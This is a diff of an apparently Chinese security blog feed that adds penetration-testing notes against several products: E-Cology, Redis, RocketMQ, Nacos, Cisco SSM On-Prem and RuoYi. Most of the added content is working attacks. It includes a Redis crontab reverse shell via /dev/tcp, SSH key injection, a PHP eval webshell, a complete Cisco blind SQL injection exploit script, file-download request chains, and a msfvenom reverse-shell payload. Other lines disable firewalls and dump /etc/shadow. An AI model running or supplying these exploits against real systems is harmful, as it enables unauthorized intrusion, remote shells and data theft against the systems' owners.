@@ -146,6 +146,15 @@
 </blockquote>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">GET /servlet/codesettree?categories=~31~27~20union~20all~20select~20~27hongjing~27~2c~40~40version~2d~2d&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1 HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/113.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br></pre></td></tr></table></figure>
 
+<h4 id="泛微E-Cology"><a href="#泛微E-Cology" class="headerlink" title="泛微E-Cology"></a>泛微E-Cology</h4><h5 id="FileDownloadForOutDoc-SQL注入"><a href="#FileDownloadForOutDoc-SQL注入" class="headerlink" title="FileDownloadForOutDoc  SQL注入"></a>FileDownloadForOutDoc  SQL注入</h5><h6 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h6><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ecology 9.x 补丁版本 &lt; 10.58.0</span><br><span class="line">Ecology 8.x 补丁版本 &lt; 10.58.0</span><br></pre></td></tr></table></figure>
+
+<p>fofa语法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">app=&quot;泛微-协同办公OA&quot;</span><br></pre></td></tr></table></figure>
+
+<p>poc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /weaver/weaver.file.FileDownloadForOutDoc HTTP/1.1</span><br><span class="line">Host: xxxxxx</span><br><span class="line">Accept: */*</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Connection: close        </span><br><span class="line"></span><br><span class="line">fileid=2+WAITFOR DELAY+&#x27;0:0:5&#x27;&amp;isFromOutImg=1</span><br></pre></td></tr></table></figure>
+
+<p><a href="https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml">https://github.com/UltimateSec/ultimaste-nuclei-templates/blob/main/ecology-oa/ecology-oa-filedownloadforoutdoc-sqli.yaml</a></p>
 <h4 id="金蝶云星空RCE漏洞"><a href="#金蝶云星空RCE漏洞" class="headerlink" title="金蝶云星空RCE漏洞"></a>金蝶云星空RCE漏洞</h4><blockquote>
 <p><a href="https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502">https://blog.csdn.net/qq_41904294/article/details/131332436?spm=1001.2014.3001.5502</a></p>
 </blockquote>
@@ -181,6 +190,75 @@
 <p>由于该漏洞不仅影响管理中心（默认8000端口），也影响普通应用（默认80端口）。如果其它版本通过限制访问来源临时缓解漏洞，需要考虑是否会中断普通用户Web业务。</p>
 <h6 id="升级修复方案"><a href="#升级修复方案" class="headerlink" title="升级修复方案"></a>升级修复方案</h6><p>7.x版本必须先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
 <p>8.x版本管理中心（默认8000端口）默认不对外开放，且包含修复代码。但是直接安装临时补丁可能会失败，所以依旧建议先安装全量补丁（修复代码）后安装临时补丁（添加安全配置）</p>
+<h3 id="redis"><a href="#redis" class="headerlink" title="redis"></a>redis</h3><h4 id="计划任务反弹shell"><a href="#计划任务反弹shell" class="headerlink" title="计划任务反弹shell"></a>计划任务反弹shell</h4><blockquote>
+<p>redis以root身份运行</p>
+<p>未授权访问或授权口令已知</p>
+</blockquote>
+<p>在kali中通过<code>redis-cli -h 192.168.100.101 -p 6379</code>连接到redis，输入以下指令利用crontab反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># cron表达式格式：&#123;秒数&#125; &#123;分钟&#125; &#123;小时&#125; &#123;日期&#125; &#123;月份&#125; &#123;星期&#125; &#123;年份(可为空)&#125; 命令</span><br><span class="line"># 每分钟执行一次echo &quot;haha&quot;：* * * * * echo &quot;haha&quot;</span><br><span class="line">192.168.100.101:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.99/4444 0&gt;&amp;1\n&quot;</span><br><span class="line"></span><br><span class="line"># 设置目录为/var/spool/cron/</span><br><span class="line">192.168.100.101:6379&gt; config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line"># 设置文件名为root</span><br><span class="line">192.168.100.101:6379&gt; config set dbfilename root</span><br><span class="line"></span><br><span class="line"># 保存快照到本地</span><br><span class="line">192.168.100.101:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p>kali中打开一个新的命令行窗口执行<code>nc -lvnp 4444</code>进行监听，过一会儿就能接收到反弹回来的shell：</p>
+<p>由于redis的压缩储存机制，在某些情况下会因为反弹shell的指令被压缩，从而导致反弹shell失败：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">192.168.100.101:6379&gt; set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.100.100/4444 0&gt;&amp;1\n&quot;</span><br><span class="line">192.168.100.101:6379&gt; save</span><br></pre></td></tr></table></figure>
+
+<p>[root@localhost ~]# cat &#x2F;var&#x2F;spool&#x2F;cron&#x2F;root</p>
+<ul>
+<li>bash -i &amp;&gt; &#x2F;dev&#x2F;tcp&#x2F;192.168.100@&#x2F;4 0&gt;&amp;1</li>
+</ul>
+<p>当运行redis的用户为普通用户时，会无法出现切换目录失败的情况：</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">config set dir /var/spool/cron</span><br><span class="line">(error) ERR Changing directory: Permission denied</span><br></pre></td></tr></table></figure>
+
+<h4 id="SSH公钥"><a href="#SSH公钥" class="headerlink" title="SSH公钥"></a>SSH公钥</h4><blockquote>
+<p>redis以root身份运行</p>
+<p>未授权访问或者授权口令已知</p>
+<p>服务开启ssh服务且允许密钥登录</p>
+</blockquote>
+<p>在kali中使用<code>ssh-keygen -t rsa</code>生成密钥：</p>
+<p>将生成的公钥保存到本地</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# (echo -e &quot;\n\n&quot;; cat /root/.ssh/id_rsa.pub; echo -e &quot;\n\n&quot;) &gt; kali</span><br></pre></td></tr></table></figure>
+
+<p>将文件写入redis进行利用</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 将上一步生成的kali文件写入redis并设置键的值为kali</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# cat kali | redis-cli -h 192.168.100.101 -p 6379 -x set kali</span><br><span class="line"></span><br><span class="line"># 连接redis，并将公钥文件写入/root/.ssh/authorized_keys中</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# redis-cli -h 192.168.100.101 -p 6379</span><br><span class="line">192.168.100.101:6379&gt; config set dir /root/.ssh/</span><br><span class="line">192.168.100.101:6379&gt; config set dbfilename authorized_keys</span><br><span class="line">192.168.100.101:6379&gt; save</span><br><span class="line"></span><br><span class="line"># 使用密钥进行登录</span><br><span class="line">┌──(root💀kali)-[/home/kali]</span><br><span class="line">└─# ssh -i /root/.ssh/id_rsa root@192.168.100.101</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h4><blockquote>
+<p>服务器开着web服务且web目录路径已知</p>
+<p>未授权访问或者授权口令已知</p>
+</blockquote>
+<p>倘若服务器运行着LAMP&#x2F;LNMP服务，且已知工作目录为<code>/var/www/html/</code>，可通过以下指令写入webshell，或参考写入SSH公钥的过程写入木马文件</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /var/www/html/</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set x &quot;&lt;?php @eval($_POST[&#x27;test&#x27;]);?&gt;&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="主从复制rce"><a href="#主从复制rce" class="headerlink" title="主从复制rce"></a>主从复制rce</h4><blockquote>
+<p>redis &lt;&#x3D; 5.0.5</p>
+<p>未授权访问</p>
+</blockquote>
+<p><a href="https://github.com/n0b0dyCN/redis-rogue-server">https://github.com/n0b0dyCN/redis-rogue-server</a></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;</span><br></pre></td></tr></table></figure>
+
+<p>参数说明</p>
+<ul>
+<li>–rpasswd 如果目标Redis服务开启了认证功能，可以通过该选项指定密码</li>
+<li>–rhost 目标redis服务IP</li>
+<li>–rport 目标redis服务端口，默认为6379</li>
+<li>–lhost vps的IP地址</li>
+<li>–lport vps的端口，默认为21000</li>
+</ul>
+<h3 id="apache"><a href="#apache" class="headerlink" title="apache"></a>apache</h3><p>Apache RocketMQ NameServer    cve-2023-33246</p>
+<blockquote>
+<p> CVE-2023-37582 中，由于对 CVE-2023-33246 修复不完善，导致在Apache RocketMQ NameServer 存在未授权访问的情况下，攻击者可构造恶意请求以RocketMQ运行的系统用户身份执行命令。</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 check.py --ip 127.0.0.1 --port 9876</span><br><span class="line">python3 check.py --cidr 192.168.1.0/24</span><br><span class="line"># or </span><br><span class="line">python3 check.py --file rocketmq_targets.txt --port 9876</span><br><span class="line"># target in file format:</span><br><span class="line"># ip</span><br><span class="line"># ip:port</span><br><span class="line"># http://ip:port</span><br></pre></td></tr></table></figure>
+
+<p>@J@#DaTang2023</p>
+<h3 id="nacos"><a href="#nacos" class="headerlink" title="nacos"></a>nacos</h3><p>未授权访问</p>
+<p><a href="http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&pageSize=9（ip和端口用x代替）">http://x.x.x.x:xxxx/nacos/v1/auth/users?pageNo=1&amp;pageSize=9（ip和端口用x代替）</a></p>
+<p>可以看到账号密码</p>
+<p>get 参数改成post然后提交一个新的用户名和密码</p>
+<p>POST <a href="https://link.zhihu.com/?target=http://IP">http://IP</a>:端口&#x2F;nacos&#x2F;v1&#x2F;auth&#x2F;users?username&#x3D;test1&amp;password&#x3D;test1</p>
+<p>这个时候我们用test1登录</p>
 <h3 id="海康威视"><a href="#海康威视" class="headerlink" title="海康威视"></a>海康威视</h3><h4 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h4><p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651655167.png" alt="1686651655167"></p>
 <h4 id="cve-2017-7921-x2F-7923"><a href="#cve-2017-7921-x2F-7923" class="headerlink" title="cve-2017-7921&#x2F;7923"></a>cve-2017-7921&#x2F;7923</h4><p><strong>影响范围</strong></p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/img1686651720225.png" alt="1686651720225"></p>
@@ -294,6 +372,21 @@
 
 <p><strong>这里借助借助VLC media player 播放去访问rtsp协议摄像头</strong></p>
 <p><img src="https://wangzhi0013-1310260802.cos.ap-nanjing.myqcloud.com/imgimage-20230613185641997.png" alt="image-20230613185641997"></p>
+<h3 id="思科"><a href="#思科" class="headerlink" title="思科"></a>思科</h3><blockquote>
+<p>Cisco Smart Software Manager On-Prem (SSM On-Prem) 基于 Web 的管理界面中存在漏洞，可能允许经过身份验证的远程攻击者对受影响的系统进行 SQL 注入攻击。该漏洞的存在是因为基于 Web 的管理界面无法充分验证用户输入。攻击者可以通过以低权限用户身份向应用程序进行身份验证并向受影响的系统发送精心设计的 SQL 查询来利用此漏洞。</p>
+</blockquote>
+<p>1.改poc里边的ip和cookie</p>
+<p>2.python exploit.py</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Smart Software Manager On-Prem Release 8-202212 - Authenticated SQL Injection in &#x27;filter_by&#x27; parameter</span></span><br><span class="line"><span class="string">Download link: https://software.cisco.com/download/home/286285506/type/286326948/release/8-202212</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Usage:</span></span><br><span class="line"><span class="string">1. Update host and cookies variables,</span></span><br><span class="line"><span class="string">2. Run `python3 exploit.py`</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Tested on Ubuntu 22.04.1 LTS, Python 3.10.6</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">by redfr0g@stmcyber 2023</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> warnings</span><br><span class="line"></span><br><span class="line"><span class="comment"># script parameters, update accoridingly</span></span><br><span class="line">host = <span class="string">&quot;&lt;IP&gt;:8443&quot;</span></span><br><span class="line">cookies = &#123;<span class="string">&quot;_lic_engine_session&quot;</span>: <span class="string">&quot;&lt;COOKIE&gt;&quot;</span>, <span class="string">&quot;XSRF-TOKEN&quot;</span>: <span class="string">&quot;&lt;CSRFTOKEN&gt;&quot;</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;P%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">headers = &#123;<span class="string">&quot;Accept&quot;</span>: <span class="string">&quot;application/json&quot;</span>, <span class="string">&quot;Content-Type&quot;</span>: <span class="string">&quot;application/json&quot;</span>&#125;</span><br><span class="line">chars = string.printable[<span class="number">0</span>:<span class="number">95</span>]</span><br><span class="line">result = []</span><br><span class="line">search = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Cisco Smart Software Manager Release 8-202212 SQL Injection PoC&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Starting DBMS banner enumeration...&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># do error based sql injection until no match found</span></span><br><span class="line"><span class="keyword">while</span> search:</span><br><span class="line">    <span class="keyword">for</span> char <span class="keyword">in</span> chars:</span><br><span class="line">        url = <span class="string">&quot;https://&quot;</span> + host + <span class="string">&quot;/backend/notifications/search_account_notifications.json?filter_by=message_type))%20LIKE%20%27%25%27+OR+1+%3d+1/+(SELECT+CASE+WHEN+(select+version()+LIKE+&#x27;&quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result) + char + <span class="string">&quot;%25&#x27;)+THEN+0+ELSE+1+END)--%20&amp;filter_val=a&amp;offset=0&amp;limit=10&quot;</span></span><br><span class="line">        <span class="comment"># disable invalid cert warnings</span></span><br><span class="line">        <span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">            warnings.simplefilter(<span class="string">&quot;ignore&quot;</span>)</span><br><span class="line">            r = requests.get(url, headers=headers, cookies=cookies, verify=<span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;PG::DivisionByZero&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="comment"># update and print result</span></span><br><span class="line">            result.append(char)</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;[+] DBMS Banner: &quot;</span> + <span class="string">&#x27;&#x27;</span>.join(result))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> char == <span class="string">&quot; &quot;</span>:</span><br><span class="line">            <span class="comment"># stop search if no match found</span></span><br><span class="line">            search = <span class="literal">False</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="若依"><a href="#若依" class="headerlink" title="若依"></a>若依</h3><p>4.7.6任意文件下载</p>
+<blockquote>
+<p><a href="https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ">https://mp.weixin.qq.com/s/x_-N6YVzJW-INbJ02y_qVQ</a></p>
+</blockquote>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxx/RuoYi/upload/123.txt&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=xxxx.yaml;.zip HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=0655e330-b04f-4487-8617-715d58f2a82c</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /monitor/job/add HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: application/json, text/javascript, */*; q=0.01</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Content-Length: 84</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Origin: http://192.168.124.6</span><br><span class="line">Referer: http://192.168.124.6/monitor/job</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">createBy=admin&amp;jobName=renwu&amp;jobGroup=DEFAULT&amp;invokeTarget=ruoYiConfig.setProfile(<span class="string">&#x27;xxxx/RuoYi/upload&#x27;</span>)&amp;cronExpression=0%2F15+*+*+*+*+%3F&amp;misfirePolicy=1&amp;concurrent=1&amp;status=0&amp;remark=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">GET /common/download/resource?resource=/profile/123.txt HTTP/1.1</span><br><span class="line">Host: 192.168.124.6</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Cookie: JSESSIONID=b99110bd-0cb2-44b8-a2e8-880d2082b81d</span><br><span class="line">Referer: http://192.168.124.6/index</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/112.0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
 ]]></content>
       <tags>
         <tag>网络安全</tag>
@@ -641,16 +734,35 @@
 
 <h5 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h5><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">关闭防火墙和开启3389</span><br><span class="line">netsh firewall <span class="built_in">set</span> opmode mode=<span class="built_in">disable</span></span><br><span class="line"></span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 0 /f</span><br></pre></td></tr></table></figure>
 
+<p>msf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#生成payload</span><br><span class="line">msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.1 LPORT=2333 -f py</span><br><span class="line"></span><br><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>proxychains安装</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt-get install proxychains</span><br><span class="line">vim /etc/proxychains.conf</span><br><span class="line">添加socks5  127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p>sqlmap   用友ehr绕过</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http://x.x.x.x/servlet/codesettree?categories=1&amp;codesetid=1&amp;flag=c&amp;parentid=-1&amp;status=1&quot;  -p categories --dbms=&quot;Microsoft SQL Server&quot; --tamper ehr_SafeCodeEncode_tamper --level 3</span><br></pre></td></tr></table></figure>
+
 
 
 <p>docker</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入容器内部</span><br><span class="line">docker exec -it &lt;id&gt;   /bin/bash</span><br><span class="line"></span><br><span class="line">#检测是否在docker中</span><br><span class="line"># 是否存在此文件</span><br><span class="line">ls -al /.dockerenv</span><br><span class="line"></span><br><span class="line"># 在其中是否包含docker字符串</span><br><span class="line">cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#进入容器内部</span><br><span class="line">docker exec -it &lt;id&gt;   /bin/bash</span><br><span class="line"> #查看docker状态</span><br><span class="line">docker container ls    </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#检测是否在docker中</span><br><span class="line"> # 是否存在此文件</span><br><span class="line"> ls -al /.dockerenv</span><br><span class="line"></span><br><span class="line"> # 在其中是否包含docker字符串</span><br><span class="line"> cat /proc/1/cgroup</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<p>webrtc</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">about:config，将media.peerconnection.enabled值改为false；</span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset=&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;WebRTC泄露检测&lt;/title&gt;</span><br><span class="line">  &lt;/head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;script&gt;</span><br><span class="line">      function findIP(onNewIP) &#123;</span><br><span class="line">        var myPeerConnection = window.RTCPeerConnection || window.mozRTCPeerConnection || window.webkitRTCPeerConnection;</span><br><span class="line">        var pc = new myPeerConnection(&#123;iceServers: [&#123;urls: &quot;stun:stun.l.google.com:19302&quot;&#125;]&#125;),</span><br><span class="line">        noop = function() &#123;&#125;,</span><br><span class="line">        localIPs = &#123;&#125;,</span><br><span class="line">        ipRegex = /([0-9]&#123;1,3&#125;(\.[0-9]&#123;1,3&#125;)&#123;3&#125;|[a-f0-9]&#123;1,4&#125;(:[a-f0-9]&#123;1,4&#125;)&#123;7&#125;)/g,</span><br><span class="line">        key;</span><br><span class="line"></span><br><span class="line">        function ipIterate(ip) &#123;</span><br><span class="line">          if (!localIPs[ip]) onNewIP(ip);</span><br><span class="line">          localIPs[ip] = true;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        pc.createDataChannel(&quot;&quot;);</span><br><span class="line"></span><br><span class="line">        pc.createOffer(function(sdp) &#123;</span><br><span class="line">          sdp.sdp.split(&#x27;\n&#x27;).forEach(function(line) &#123;</span><br><span class="line">            if (line.indexOf(&#x27;candidate&#x27;) &lt; 0) return;</span><br><span class="line">            line.match(ipRegex).forEach(ipIterate);</span><br><span class="line">          &#125;);</span><br><span class="line">          pc.setLocalDescription(sdp, noop, noop);</span><br><span class="line">        &#125;, noop);</span><br><span class="line"></span><br><span class="line">        pc.onicecandidate = function(ice) &#123;</span><br><span class="line">          if (!ice || !ice.candidate || !ice.candidate.candidate || !ice.candidate.candidate.match(ipRegex)) return;</span><br><span class="line">          ice.candidate.candidate.match(ipRegex).forEach(ipIterate);</span><br><span class="line">        &#125;;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      function show(ip) &#123;</span><br><span class="line">        alert(ip);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      findIP(show);</span><br><span class="line"></span><br><span class="line">&lt;/script&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
 
 
 
 <p>linux</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#切换账户到admin</span></span><br><span class="line">su -l admin </span><br><span class="line"></span><br><span class="line"><span class="comment">#创建账户</span></span><br><span class="line">useradd   name  </span><br><span class="line">passwd   name</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置静态网卡</span></span><br><span class="line">vim /etc/sysconfig/network-scripts/ifcfg-eno</span><br><span class="line">systemctl restart network</span><br><span class="line"><span class="comment">#关闭防火墙和临时禁用selinux安全模块</span></span><br><span class="line">systemctl stop firewalld</span><br><span class="line">setenforce 0</span><br><span class="line"><span class="comment">#清空防火墙规则</span></span><br><span class="line">iptables -F</span><br><span class="line">获取内核，操作系统和设备信息</span><br><span class="line">版本信息</span><br><span class="line"><span class="built_in">uname</span> -a 所有版本</span><br><span class="line"><span class="built_in">uname</span> -r 内核版本信息</span><br><span class="line"><span class="built_in">uname</span> -n 系统主机名字</span><br><span class="line"><span class="built_in">uname</span> -m Linux内核架构</span><br><span class="line">内核信息 <span class="built_in">cat</span> /proc/version</span><br><span class="line">CPU信息 <span class="built_in">cat</span> /proc/cpuinfo</span><br><span class="line">发布信息</span><br><span class="line"><span class="built_in">cat</span> /etc/*-release</span><br><span class="line"><span class="built_in">cat</span> /etc/issue</span><br><span class="line">主机名 hostname</span><br><span class="line">文件系统 <span class="built_in">df</span> -a</span><br><span class="line">内核日志 dmesg / /var/log/dmesg</span><br><span class="line">6.2.1.2. 用户和组</span><br><span class="line">列出系统所有用户 <span class="built_in">cat</span> /etc/passwd</span><br><span class="line">列出系统所有组 <span class="built_in">cat</span> /etc/group</span><br><span class="line">列出所有用户<span class="built_in">hash</span>（root）``<span class="built_in">cat</span> /etc/shadow``</span><br><span class="line">用户</span><br><span class="line">查询用户的基本信息 finger</span><br><span class="line">当前登录的用户 <span class="built_in">users</span> <span class="built_in">who</span> -a /var/log/utmp</span><br><span class="line">查询无密码用户 grep <span class="string">&#x27;x:0:&#x27;</span> /etc/passwd</span><br><span class="line">目前登录的用户 w</span><br><span class="line">登入过的用户信息 last / /var/log/wtmp</span><br><span class="line">显示系统中所有用户最近一次登录信息 lastlog / /var/log/lastlog</span><br><span class="line">登录成功日志 /var/log/secure</span><br><span class="line">登录失败日志 /var/log/faillog</span><br><span class="line">查看特权用户 grep :0 /etc/passwd</span><br><span class="line">查看passwd最后修改时间 <span class="built_in">ls</span> -l /etc/passwd</span><br><span class="line">查看是否存在空口令用户 awk -F: <span class="string">&#x27;length($2)==0 &#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看远程登录的账号 awk <span class="string">&#x27;/\$1|\$6/&#123;print $1&#125;&#x27;</span> /etc/shadow</span><br><span class="line">查看具有sudo权限的用户</span><br><span class="line"><span class="built_in">cat</span> /etc/sudoers | grep -v <span class="string">&quot;^#\|^$&quot;</span> | grep <span class="string">&quot;ALL=(ALL)&quot;</span></span><br><span class="line">6.2.1.3. 用户和权限信息</span><br><span class="line">当前用户 <span class="built_in">whoami</span></span><br><span class="line">当前用户信息 <span class="built_in">id</span></span><br><span class="line">可以使用sudo提升到root的用户（root） <span class="built_in">cat</span> /etc/sudoers</span><br><span class="line">列出目前用户可执行与无法执行的指令 sudo -l</span><br><span class="line">6.2.1.4. 环境信息</span><br><span class="line">打印系统环境信息 <span class="built_in">env</span></span><br><span class="line">打印系统环境信息 <span class="built_in">set</span></span><br><span class="line">环境变量中的路径信息 <span class="built_in">echo</span>  <span class="variable">$PATH</span></span><br><span class="line">打印历史命令 <span class="built_in">history</span> / ~/.bash_history</span><br><span class="line">显示当前路径 <span 